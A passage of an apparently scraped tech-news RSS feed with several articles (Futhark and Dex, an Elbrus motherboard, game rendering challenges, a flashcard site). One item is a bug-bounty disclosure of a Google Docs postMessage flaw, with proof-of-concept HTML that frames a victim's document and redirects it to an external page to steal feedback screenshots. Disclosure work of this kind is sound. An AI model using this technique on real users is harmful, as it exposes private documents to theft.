<p>With respect to expressing parallelism, Dex and Futhark seem equivalent in expressive power, but Dex has the edge in concision. I’d be curious about going the other way, and porting some of the original Futhark benchmark programs <em>to</em> Dex, like <a href="https://github.com/diku-dk/futhark-benchmarks/blob/master/finpar/LocVolCalib.fut">local volumetric calibration</a>.</p>
<p>Dex has several small conveniences over Futhark: while the effect system didn’t matter much for the examples I looked at, Dex’s type classes and broadcasting operators did help a bit with making things more concise.</p>
<p>If you need AD, then Dex is miles ahead of Futhark. While I managed to implement the surface normals in the ray tracer, I gave up on porting <a href="https://google-research.github.io/dex-lang/mcmc.html">mcmc.dx</a> because it contains a higher-order function that applies the <code>grad</code> operator to a functional argument. This would have to be implemented with a higher order parametric module (<a href="https://futhark-lang.org/blog/2019-12-18-design-flaws-in-futhark.html#higher-order-modules">which I wrote were useless not long ago</a>), but I just didn’t have the heart for it. I’ll keep this as a usage case for when we implement AD properly.</p>
<p>I didn’t look much at performance, since Dex is sparsely documented and the benchmarking tools seem to be mostly for internal use. I performed a rough timing of sequential execution of the ray tracer, where the Futhark and Dex versions are about equally fast. Dex also has multi-threaded and CUDA backends, but I …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html">https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html</a></em></p>]]>
            </description>
            <link>https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559967</guid>
            <pubDate>Mon, 28 Dec 2020 15:36:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ITX Motherboard with an Elbrus CPU]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 91 (<a href="https://news.ycombinator.com/item?id=25559240">thread link</a>) | @jamesmd
<br/>
December 28, 2020 | https://blog.jmdawson.co.uk/icepeakitx-elbrus-8cb-itx-motherboard/ | <a href="https://web.archive.org/web/*/https://blog.jmdawson.co.uk/icepeakitx-elbrus-8cb-itx-motherboard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3135">

	

	<div>
		
<h2>ELBRUS MCST History</h2>



<div><p>Before we look at the IcepeakITX ELBRUS-8CB motherboard lets first look at the history of Elbrus. </p><p>Elbrus CPU’s have been around for a very long time although unless you’re from Russia you’ve likely never heard of them. </p><p>They were first released in the early 1970’s and used in the Soviet space program, nuclear weapons research and defence systems as well as for research. </p></div>



<h3>Elbrus Timeline</h3>



<ul id="block-082e432c-8cfa-49d3-a848-51fd5247f666"><li><em>Elbrus 1</em>&nbsp;(1973) was the first in the line.<ul><li>A side development was an update of the 1965&nbsp;BESM-6&nbsp;as Elbrus-1K2.</li></ul></li><li><em>Elbrus 2</em>&nbsp;(1977) was a 10-processor computer, considered the first Soviet&nbsp;supercomputer, with superscalar&nbsp;RISC&nbsp;processors. Re-implementation of the Elbrus 1 architecture with faster&nbsp;ECL&nbsp;chips.</li><li><em>Elbrus 3</em>&nbsp;(1986) was a 16-processor computer developed by the Babayan’s team, and one of the first VLIW computers in the world.</li><li><em>Elbrus 2000</em>&nbsp;(2001) was a microprocessor development of the&nbsp;<em>Elbrus 3</em>&nbsp;architecture. Also known as&nbsp;<em>Elbrus-S</em>.<ul><li><em>Elbrus-3M1</em>&nbsp;(2005) is a two-processor computer based on&nbsp;Elbrus 2000&nbsp;microprocessor working at 300&nbsp;MHz.</li><li><em>Elbrus МВ3S1/C</em>&nbsp;(2009) is a&nbsp;ccNUMA&nbsp;four-processor computer based on&nbsp;Elbrus-S&nbsp;microprocessor working at 500&nbsp;MHz.</li></ul></li><li><em>Elbrus-2S+</em>&nbsp;(2011) working at 500&nbsp;MHz, with capacity to calculate 16&nbsp;GFlops.</li><li><em>Elbrus-2SM</em>&nbsp;(2014) working at 300&nbsp;MHz, with capacity to calculate 9.6&nbsp;GFlops.</li><li><em>Elbrus-4S</em>&nbsp;(2014) working at 800&nbsp;MHz, with capacity to calculate 50&nbsp;GFlops.<sup>[1]</sup></li><li><em>Elbrus-1S+</em>&nbsp;(2016) SoC with GPU, working at 600–1000&nbsp;MHz, with capacity to calculate 24&nbsp;GFlops.</li><li><em>Elbrus-8S</em>&nbsp;(2014–2015) working at 1300&nbsp;MHz, with capacity to calculate 250&nbsp;GFlops.</li><li><em>Elbrus-8SV</em>&nbsp;(2018) working at 1500&nbsp;MHz, with capacity to calculate 576&nbsp;GFlops.</li><li><em>Elbrus-16S</em>&nbsp;(2019) working at 2000&nbsp;MHz, with capacity to calculate 1.5&nbsp;TFlops.</li></ul>



<p>Over the years Elbrus have used several different architectures including: SPARC, x86 and Elbrus 2000.<br>Back in 2014 ELBRUS released the Elbrus-4C CPU which was designed for home and office use within Russia. Performance wasn’t great and as it couldn’t fully support x86. Computers using the Elbrus-4C CPU shipped with a custom proprietary Linux distro named Elbrus OS. Little is known about the success of this platform and they are never seen in the western world. I tried to buy an Elbrus-4C computer and have it shipped from Russia to the UK back in 2015 and it proved impossible. <br></p>



<figure><img src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Elbrus-4C Based PC</figcaption></figure>



<h2>IcepeakITX ELBRUS-8CB Motherboard</h2>



<div><p>The IcepeakITX ELBRUS-8CB Motherboard is the brain child of a group of enthusiasts that banded together to crowdfund a security focused Mini ITX motherboard featuring a 1.5GHZ 8 core Elbrus 8CB CPU and ships with either 8GB or 32GB DDR4 ECC RAM. The board does not ship with a heatsink however it is compatible with any heatsink designed for the Intel LGA3647 socket. </p></div>



<figure><img src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>IcepeakITX ELBRUS-8CB Motherboard</figcaption></figure>



<h2>Full Technical Specifications</h2>



<ul><li><strong>Form-factor:</strong>&nbsp;Mini-ITX</li><li><strong>CPU:</strong>&nbsp;MCST (Moscow Center of SPARC Technologies) Elbrus-8CB 8-core @ 1.5 GHz VLIW (fully compatible with any LGA3647 heatsink)</li><li><strong>SB:</strong>&nbsp;MCST KPI-2 Multicontroller</li><li><strong>RAM:</strong>&nbsp;8 GB or 32 GB (2x [4+1] 8 Gbit/32 Gbit DDR4 DRAM 2400 MHz ECC)</li><li><strong>SATA:</strong>&nbsp;2x M.2_2280 + 4x SATA_6G</li><li><strong>Storage Expansion:</strong>&nbsp;1x microSD (HC)</li><li><strong>Cache:</strong>&nbsp;1x PATA 8 GB (required as cache device for hardware emulation of x86 on Elbrus)</li><li><strong>PCIe:</strong>&nbsp;1x PCIe2_x16 + 1x PCIe2_x1 (as USB3)</li><li><strong>Security:</strong><ul><li>1x TPM SPI connector</li><li>2x boot firmware chip with extra security</li><li>3x heatsink detectors</li><li>1x temperature sensor trigger</li><li>2x tampering sensor</li></ul></li><li><strong>Network:</strong><ul><li>Marvell M88E1111-RCJ chipset</li><li>1x 1G_SFP</li><li>3x 1G_RJ45</li></ul></li><li><strong>GPS:</strong>&nbsp;GPS chip with internal antenna port</li><li><strong>USB:</strong><ul><li>2x USB 2.0 (rear)</li><li>4x USB 2.0 (+PD) (rear)</li><li>2x USB 3.0 (rear)</li><li>1x USB 2.0 (internal)</li></ul></li><li><strong>COM:</strong>&nbsp;1x COM header (internal) required for debugging boot</li><li><strong>Debug:</strong>&nbsp;1x 6-pin debug port, 1x 4-pin (USB to GPIO)</li><li><strong>Video:</strong>&nbsp;2x HDMI (1 HDMI per SM768/256 MB)</li><li><strong>Audio:</strong>&nbsp;Integrated simple audio codec (Linux-compatible)</li><li><strong>Additional Sensors:</strong><ul><li>Fall detection sensor</li><li>Gyroscope</li><li>Water sensor</li></ul></li><li><strong>Additional Connectors:</strong><ul><li>2x PWM-4</li><li>RTC battery connector</li><li>Simple BEEP connector</li></ul></li><li><strong>PCB:</strong>&nbsp;14 layers (level 5 accuracy) / ISOLA Hi Tg 180</li></ul>



<div><p>The Motherboard is also fully opensource and after funding the board schematics and design specifications will be released on github. </p><p>Crowdfunding for the IcepeakITX ELBRUS-8CB is expected to go live early next year via crowdsupply. More details can be found <a href="https://www.crowdsupply.com/sra-centr8/icepeakitx-elbrus-8cb" target="_blank" rel="noreferrer noopener">here</a>. </p><p>Check out more interesting tech coming to crowdfunding sites <a href="https://blog.jmdawson.co.uk/category/crowdfunding/">here</a>.</p></div>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://blog.jmdawson.co.uk/icepeakitx-elbrus-8cb-itx-motherboard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559240</guid>
            <pubDate>Mon, 28 Dec 2020 14:09:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stealing private documents through a bug in Google Docs]]>
            </title>
            <description>
<![CDATA[
Score 310 | Comments 138 (<a href="https://news.ycombinator.com/item?id=25559063">thread link</a>) | @hackerpain
<br/>
December 28, 2020 | https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/ | <a href="https://web.archive.org/web/*/https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://savebreach.com/content/images/size/w300/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 300w,
                            https://savebreach.com/content/images/size/w600/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 600w,
                            https://savebreach.com/content/images/size/w1000/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 1000w,
                            https://savebreach.com/content/images/size/w2000/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://savebreach.com/content/images/size/w2000/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png" alt="Stealing your private documents through a bug in Google Docs">
            </figure>

            <section>
                <div>
                    <p>By <a href="https://twitter.com/kl_sree">KL Sreeram</a></p><p>Google has integrated a <a href="https://www.google.com/tools/feedback">feedback sharing mechanism</a> for many of its products like Google Docs, Google Sheets and so on. This feature is supposed to help users report bugs and broken functionality to Google developers who could then work on fixing it.</p><h2 id="sending-feedback-in-google-products">Sending Feedback in Google Products</h2><p>You might have noticed a <strong>Send Feedback </strong>button at the bottom of the page while using Google Docs. It's a harmless feature, and its implemented as a feed back sharing system for Google Docs when you encounter issues. When you click on the button, a popup would appear asking you to describe the problem and this feature automatically takes a screenshot, sending (uploading) the data to Google for further review.</p><figure><img src="https://savebreach.com/content/images/2020/12/image-22.png" alt=""><figcaption>The "Send Feedback" popup in Google Docs</figcaption></figure><p>This feedback sharing feature is also implemented in many other Google products using an iFrame, embedded into the parent page (the Google Product).</p><p>This made me wonder how Google was displaying this image. I found, the image was being uploaded to Google via postMessage, and then rendered in the popup box before being sent to Google for further investigation.</p><h2 id="the-bug">The Bug</h2><p>There was some cross-origin communication happening between docs.google.com, www.google.com and feedback.googleusercontent.com (which was a sandboxed domain). Even after trying a lot I was unable to find any XSS in feedback.googleusercontent.com which could have helped me in stealing the screenshot image data.</p><p>Below is a graphical representation of the steps in this process – </p><figure><img src="https://savebreach.com/content/images/2020/12/image-23.png" alt=""><figcaption>How the screenshot was uploaded to Google servers</figcaption></figure><p>The following <code>postmessage</code> function sent the data to feedback.googlusercontent.com, however the postmessage configuration didn't allow other domains to be iFramed.</p><pre><code>windowRef.postmessage("&lt;Data&gt;","https://feedback.googleusercontent.com");</code></pre><p>However, the final <code>postmessage</code> function upon submitting the feedback was configured in a manner that allowed modifying the iFrame to an evil website</p><pre><code>windowRef.postmessage("&lt;Data&gt;","*");</code></pre><p>The wildcard scope allowed the <code>postmessage</code> data to be sent to an evil attacker controlled domain. The security misconfiguration here is the wildcard scope <code>*</code> &nbsp;that allowed me to steal and hijack Google Docs screenshots which were meant to be uploaded to Google's servers</p><p>Also, worth noting that the exploit worked in this case as Google Docs, by design has no <code>X-Frame-Options header</code>, which eventually helped exploit the cross-origin communication (through postMessage), although they do have some other protection against clickjacking and similar attacks as most features are disabled when the Google Docs pages are embedded in an iFrame.</p><h2 id="the-final-exploit">The Final Exploit</h2><p>Finally, I was able to put together all these vulnerabilities, in order to extract the Google Docs page screenshot by embedding it in a malicious iFrame and using <code>window.frames.frame.location</code> to load my exploit page from an external domain and steal user's Google Docs page screenshot</p><pre><code>&lt;html&gt;
    &lt;iframe src="https://docs.google.com/document/document_ID" /&gt;
    &lt;script&gt;
       //pseudo code
        
        
        setTimeout(function(){ alert("Hello"); }, 6000);

        function exp(){
        setInterval(function(){ 
         window.frames[0].frame[0][2].location="https://geekycat.in/exploit.html";
        }, 100);
        }
    &lt;/script&gt;
&lt;/html&gt;</code></pre><p>The above exploit gets triggered only once the user clicks on <strong>Send Feedback </strong>button. For allowing the iFrame to load, a setTimeout function executes every 6s (or, 6000 ms). To hijack the frame once it loads – the setInterval is used which tries to change the location of the iFrame every 100 ms to ensure the screenshot is stolen once the iFrame loads.</p><p>This could have allowed any attacker to steal sensitive information about your Google Docs documents and presentations, since organizations use it as part of G Suite for managing highly sensitive information. Although, this attack needs some user interaction but its not impossible given an attacker can easily convince a victim to perform the needed interaction (button click).</p><p>The <code>exploit.html</code> contains a postMessage event listener that captures the URL of the uploaded image, and the attacker successfully exfiltrates the Google Docs page screenshot in this way.</p><h2 id="video-poc-of-the-exploit">Video PoC of the Exploit</h2><p>Below is a Proof of Concept video of how the exploit worked, and how it could have allowed any attacker to steal screenshots of your private Google Docs documents by loading it in an iFrame on an attacker controlled website.</p><figure><iframe width="356" height="200" src="https://www.youtube.com/embed/isM-BXj4_80?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="the-bounty">The Bounty</h2><p>Google rewarded <strong>$3133.7</strong> &nbsp;for this bug under their VRP program.</p><p><a href="https://twitter.com/kl_sree">KL Sreeram</a> is a security researcher and bug bounty hunter. He is one of the top researchers in the Google VRP program. This bug was first documented by KL Sreeram on his <a href="https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/">blog</a>.</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to SaveBreach | Cyber Security, InfoSec, Bug Bounty &amp; Domain Names</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559063</guid>
            <pubDate>Mon, 28 Dec 2020 13:35:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Recurring reviews to track the whole lifecycle of a product]]>
            </title>
            <description>
<![CDATA[
Score 171 | Comments 59 (<a href="https://news.ycombinator.com/item?id=25558891">thread link</a>) | @hubraumhugo
<br/>
December 28, 2020 | https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product | <a href="https://web.archive.org/web/*/https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558891</guid>
            <pubDate>Mon, 28 Dec 2020 13:05:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Images of the the samples returned to earth from the asteroid Ryugu]]>
            </title>
            <description>
<![CDATA[
Score 507 | Comments 129 (<a href="https://news.ycombinator.com/item?id=25558874">thread link</a>) | @naetius
<br/>
December 28, 2020 | http://www.hayabusa2.jaxa.jp/en/topics/20201225_samples/ | <a href="https://web.archive.org/web/*/http://www.hayabusa2.jaxa.jp/en/topics/20201225_samples/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://www.hayabusa2.jaxa.jp/en/topics/20201225_samples/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558874</guid>
            <pubDate>Mon, 28 Dec 2020 13:01:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why are video games graphics (still) a challenge?]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25558815">thread link</a>) | @mariuz
<br/>
December 28, 2020 | https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/ | <a href="https://web.archive.org/web/*/https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<h2>Intro</h2>



<p>This post will cover challenges and aspects of production to consider when creating new rendering / graphics techniques and algorithms – especially in the context of <strong>applied research for real time rendering</strong>. I will base this on my personal experiences, working on <strong>Witcher 2, Assassin’s Creed 4: Black Flag, Far Cry 4, and God of War</strong>.</p>



<p>Many of those challenges are easily ignored – they are <strong>real problems in production</strong>, but not necessarily there only if you only read about those techniques, or if you work on pure research, writing papers, or create tech demos.</p>



<p>I have seen statements like “why is this brilliant research technique X not used in production?” both from gamers, but also from my colleagues with academic background. And there are always some good reasons!</p>



<p>The post is also inspired by <a href="https://twitter.com/bartwronsk/status/1327509557015310336">my joke tweet</a> from a while ago about appearing smart and mature as a graphics programmer by “dismissing” most of the rendering techniques – that they are not going to work on foliage. 🙂&nbsp;And yes, I will come back to vegetation rendering a few times in this post.</p>



<p>I tend to think of this topic as well when I hear discussions about how “photogrammetry, raytracing, neural rendering, [insert any other new how topic] will be a universal answer to rendering and replace everything!”. Spoiler alert: not gonna happen (soon).</p>



<h2>Target audience</h2>



<p>Target audience of my post are:</p>



<ul><li>Students in computer graphics and applied researchers,</li><li>Rendering engineers, especially ones earlier in their career – who haven’t built their intuition yet,</li><li>Tech artists and art leads / producers,</li><li>Technical directors and decision makers without background in graphics,</li><li>Hardware engineers and architects working on anything GPU or graphics related (and curious what makes it complicated to use new HW features),</li><li>People who are excited and care about game graphics (or real time graphics in general) and would like to understand a bit “how sausages are made”. Some concepts might be too technical and too much jargon, but then feel free to skip those.</li></ul>



<p>Note that I didn’t place “pure” academic researchers in the above list – as I don’t think that pure research should be considering too many obstacles. Role of the fundamental research is inspiration and creating theory that can be later productionized by people who are experts in productionization.</p>



<p>But if you are a pure researcher and somehow got here, I’ll be happy if you’re interested in what kinds of problems might be on the long way from idea or paper to a product (and <strong>why most new genuinely good research will never find its place in products</strong>).</p>



<h2>How to interpret the guide</h2>



<p>Very important note – <strong>none </strong>of the “obstacles” I am going to describe <strong>are deal breakers</strong>.</p>



<p>Far from it – most successful tech that became state of the art violates many of those constraints! It simply means that those are challenges that will need to be overcome in some way – manual workarounds, feature exclusivity, ignoring the problems, or applying them only in specific cases.</p>



<p>I am going to describe first the <strong>use-cases</strong> – potential uses of the technology and how those impact potential requirements and constraints.</p>



<h2>Use case</h2>



<p>The categories of “use cases” deserve some explanation and description of “severity” of their constraints.</p>



<h3>Tech demo&nbsp;</h3>



<p>Tech demo is the easiest category. If your whole product is a <strong>demonstration of a given technique </strong>(whether for benchmarking, showing off some new research, artistic demoscene), most of the considerations go away.</p>



<p>You can actually retrofit everything: from the demo concept, art itself, camera trajectory to show off the technology the best and avoid any problems.</p>



<p>The main considerations will be around performance (a choppy tech demo can be seen as a tech failure) and working very closely with artists able to show it off.</p>



<p>The rest? Hack away, write one-off code – just don’t have expectations that turning a tech demo into a production ready feature is simple or easy (it’s more like the 99% of work remaining).</p>



<h3>Special level / one-off</h3>



<p>The next level “up” in the difficulty is creating some <strong>special features that are one-off</strong>. It can be some visual special effect happening in a single scene, game intro, or a single level that is different from the other ones. In this case, a feature doesn’t need to be very “robust”, and often replaces many others.</p>



<p>An example could be lighting in the jungle levels in Assassin’s Creed 4: Black Flag that I worked on.&nbsp;</p>



<div><figure><img src="https://lh3.googleusercontent.com/51bdx_bCzH7HBQ7NjppuafWVspC1jLwJ4OwbTLwYq1DLDnnOlxNGZtXby8mLGdqhnjC00WyxAfq1L3d8EIOatPflkT4phHF4Xq2WxOeUSlRCymYNEPQW3WiOeywiz8edAD592PNh" alt="" width="458" height="610"><figcaption>Source: Assassin’s Creed 4: Black Flag promo art. Notice the caustics-like lightshafts that were key rendering feature in jungle levels – and allowed us to save a lot on the shadows rendering!</figcaption></figure></div>



<p>Jungles were “cut off” from the rest of the open world by special streaming corridors and we completely replaced the whole lighting in them! Instead of relying on tree shadow maps and global lighting, we created <strong>fake “caustics”</strong> that looked much softer and played very nicely with our volumetric lighting / atmospherics system. They not only looked better, but also were much faster – obviously worked only because of those special conditions.</p>



<h3>Cinematics</h3>



<p>A slightly more demanding type of feature is cinematic-only one. Cinematics are a bit different as they can be very strictly controlled by cinematic artists and <strong>most of their aspects like lighting, character placement, or animations are faked</strong> – just like in regular cinema! Cinematics often feature fast camera cuts (useful to hide any transitions/popping) and have more computational budget due to more predictable nature (and even in 60fps console games rendered in 30fps).</p>



<div><figure><img src="https://lh3.googleusercontent.com/g3SLk16AtqBNz6TfdSXtNhMDqo6sPXIrwQUQWEjGas1fZ3vYUVLWf_vC5or3-Gen-0Z1WRlt9M46eDiBv5b1tSmU_A0aqKPbq2zR-iJ5IerV42EpuGfrgdTtJVygjhpuQ7R1_-0C" alt=""><figcaption>Witcher 2 cinematic featuring higher character LODs, nice realistic large radius bokeh and custom lighting – but notice how few objects to render are there!</figcaption></figure></div>



<h3>Regular rendering feature</h3>



<p>“Regular” features – lighting, particles, geometry rendering – are the <strong>hardest category</strong>. They need to be either very easy to implement (most of the obstacles / problems solved easily), provide huge benefits surpassing state of the art by far to facilitate the adoption pain, or have some very excited team pushing for it (never underestimate the drive of engineers or artists that really want to see something happen!).</p>



<p>Most of my post will focus on those.&nbsp;</p>



<h3>Key / differentiating feature</h3>



<p>Paradoxically, if something is a key or differentiating feature, this can alleviate many of the difficulties. Let’s take VR – there stereo, performance (low latency), and perfect AA with no smudging (so rather forget about TAA), are <strong>THE features and absolutely core to the experience</strong>. This means that you can completely ignore for example rendering foliage or some animations that would look uncannily – as being immersed and the VR experience of being there are much more important!</p>



<h2>Feature compatibility</h2>



<p>Let’s have a look at compatibility of a newly developed feature with some other common “features” (the distinction between “features”, and the next large section “pipeline” is fuzzy).</p>



<p>Features are not the most important of challenges – arguably the category I’m going to cover at the end (the “process”) is. But those are fun and easy to look at!&nbsp;</p>



<h3>Dense geometry</h3>



<p>Dense geometry like <strong>foliage </strong>– a “feature” that inspired this post – is an enemy of most rendering algorithms.</p>



<p>The main problem is that with very dense geometry (lots of overlapping and small triangles), many “optimizations” and assumptions become impossible.</p>



<p>Early Z and occlusion culling? Very hard.&nbsp;</p>



<p>Decoupling surfaces from volumes? Very hard.</p>



<p>Storing information per unique surface parametrization? Close to impossible.</p>



<p>Amount of vertices to animate and pixels to shade? Huge, shaders need simplification!</p>



<div><figure><img src="https://lh4.googleusercontent.com/P3m7eTgVGodadf6TSd7Ca4Th8wedlR3AEr0wghmVTz0klnfU2hUTq4K1jRdhLljGMRQKgiG-pq02Ayc5Dtllma_jLOF60rtSCx0jID78CYen8cyAW3z2N_bCPYh7KvemZ2k8bWIX" alt=""><figcaption>Witcher 2 foliage – that density! Still IMO one of the best forests in any game.</figcaption></figure></div>



<p>Dense geometry through which you can see (like grass blades) is incompatible with many techniques, for example lightmapping (storing a precomputed lighting per every grass blade texel would be very costly).</p>



<p>If a game has a tree here and there or is placed in a city, this might not be a problem. But for any “natural” environment, a big chunk of the productionization of any feature is going to be combining it to coexist well with foliage.</p>



<h3>Alpha testing</h3>



<p>Alpha testing is an extension of the above, as it disables even more hardware features / optimizations.</p>



<p>Alpha testing is a technique, when a pixel evaluates “alpha” value from a texture or pixel shader computations, and <strong>based on some fixed threshold, doesn’t render/write it</strong>.</p>



<p>It is much faster than alpha blending, but for example disables early z writes (early z tests are ok), and requires raytracing hit shaders and reading a texture to decide if a texel was opaque or not.</p>



<p>It also makes antialiasing very challenging (forget about regular MSAA, you have to emulate alpha to coverage…).</p>



<p>For a description and great visual explanation of some problems, see this blog post of <a href="https://bgolus.medium.com/anti-aliased-alpha-test-the-esoteric-alpha-to-coverage-8b177335ae4f">Ben Golus</a>.</p>



<h3>Animation – skeletal</h3>



<p>Most animators work with “skeletal animations”. <strong>Creating rigs, skinning meshes, animating skeletons</strong>. When you create a new technique for rendering meshes that relies on some heavy precomputations, would animators be able to “deform” it? Would they be able to plug it into a complicated animation blending system? How does it fit in their workflow?</p>



<p>Note that it can also mean rigid deformations, like a rotating wheel – it’s much cheaper to render complicated objects as a skinned whole, than splitting them.</p>



<p>And animation is a must, cannot be an afterthought in any commercial project.</p>



<figure><img src="https://lh5.googleusercontent.com/WBPNVuhqPnwXvUjbrp1UpzraK24bQT3VrXJgslGPgwWqC2M__So3SISqaiBrNytVVvy7HqVV6V64o1VFsAM5NxbzOEn5lwll6ayTOd49M5oC2rF9AAHk5ryI--vv8lqe2rCPWBoU" alt=""><figcaption>Witcher 2 trebuchets were not people, but also had “skeletons” and “bones” and were using skeletal animations!</figcaption></figure>



<h3>Animation – procedural and non-rigid</h3>



<p>The next category of animations are “procedural” and non-rigid. Procedural animations are useful for any animation that is “endless”, relatively simple, and shouldn’t loop too visibly. The most common example is <strong>leaf shimmer and branch movement</strong>.</p>



<p>S…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</a></em></p>]]>
            </description>
            <link>https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558815</guid>
            <pubDate>Mon, 28 Dec 2020 12:51:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I built a flashcard platform that supports latex and code highlighting]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25558420">thread link</a>) | @mvind
<br/>
December 28, 2020 | https://memordo.com/m/h | <a href="https://web.archive.org/web/*/https://memordo.com/m/h">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-28a2eea8=""><p><img id="hero-pic" src="https://memordo-assets.ams3.digitaloceanspaces.com/front-page-assets/Group%203%20%281%29.png" data-v-28a2eea8=""></p> <div data-v-28a2eea8=""> <h3 data-v-28a2eea8="">
        Introducing the all-new collaborative flashcard platform, lovingly made to help you.

      </h3> </div></div><div data-v-28a2eea8=""><div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/typing.801f4d3.svg" data-v-28a2eea8=""><br data-v-28a2eea8="">
             Use the familiar Anki flashcard types like <strong data-v-28a2eea8=""> single</strong>, <strong data-v-28a2eea8="">double</strong>, <strong data-v-28a2eea8="">cloze deletion</strong>.
          </p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/schedule.cbe60f8.svg" data-v-28a2eea8=""> <br data-v-28a2eea8="">
          Create <strong data-v-28a2eea8=""> custom study schedules </strong></p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/analytics.3f4cba7.svg" data-v-28a2eea8=""> <br data-v-28a2eea8="">
            Gain <strong data-v-28a2eea8=""> insights </strong> into your studying
          </p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/network.edf1efc.svg" data-v-28a2eea8=""> <br data-v-28a2eea8=""> <strong data-v-28a2eea8=""> Share </strong> and <strong data-v-28a2eea8=""> collaborate </strong> in creating flashcards
          </p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/digital-marketing.7ca7dbb.svg" data-v-28a2eea8=""><br data-v-28a2eea8="">
